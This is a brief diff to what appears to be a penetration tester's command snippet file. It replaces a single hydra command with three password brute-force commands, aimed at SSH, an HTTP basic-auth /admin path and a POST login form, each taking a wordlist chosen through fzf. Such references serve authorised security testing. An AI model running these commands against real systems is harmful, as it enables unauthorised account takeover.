@@ -1,1 +1,3 @@
-hydra -l $USER -P passwords.txt -s $PORT -f $TARGET http-get /admin
+hydra -l $USER -P `fzf-wordlists` ssh://$TARGET
+hydra -l $USER -P `fzf-wordlists` $TARGET -s $PORT http-get /admin
+hydra -l $USER -P `fzf-wordlists` $TARGET -s $PORT http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
